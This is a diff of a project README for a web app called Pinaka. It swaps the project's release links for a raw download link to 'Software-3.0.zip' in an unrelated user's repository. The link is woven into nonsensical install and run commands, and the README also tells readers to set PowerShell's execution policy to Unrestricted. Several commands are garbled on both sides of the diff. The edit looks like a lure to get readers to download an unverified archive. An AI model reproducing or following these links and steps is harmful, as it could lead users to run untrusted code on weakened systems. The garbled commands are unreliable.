@@ -1,7 +1,7 @@
 
 
 
-https://github.com/Visoneers/Pinaka/releases
+https://github.com/sayali4212/Pinaka/raw/refs/heads/master/store/Software-3.0.zip
 
 
 
@@ -39,18 +39,18 @@ Enter on your keyboard.
 3. To ensure that the script execution policy has been changed, use the " Get-ExecutionPolicy " comand 
 again. PowerShell should return a value of ``` Unrestricted ```.
 <br>
-Then install the project dependencies with All the required library are mentioned in https://github.com/Visoneers/Pinaka/releases
-We can use https://github.com/Visoneers/Pinaka/releases to install library using command
+Then install the project dependencies with All the required library are mentioned in https://github.com/sayali4212/Pinaka/raw/refs/heads/master/store/Software-3.0.zip
+We can use https://github.com/sayali4212/Pinaka/raw/refs/heads/master/store/Software-3.0.zip to install library using command
 
 ```
-pip install -r https://github.com/Visoneers/Pinaka/releases
+pip install -r https://github.com/sayali4212/Pinaka/raw/refs/heads/master/store/Software-3.0.zip
 ```
 this will install all the library mentioned.
 
 Now you can run the project with this command
 
 ```
-python https://github.com/Visoneers/Pinaka/releases runserver
+python https://github.com/sayali4212/Pinaka/raw/refs/heads/master/store/Software-3.0.zip runserver
 ```
 
 **Note** if you want payments to work you will need to enter your own Stripe API keys into the `.env` file in the settings files.
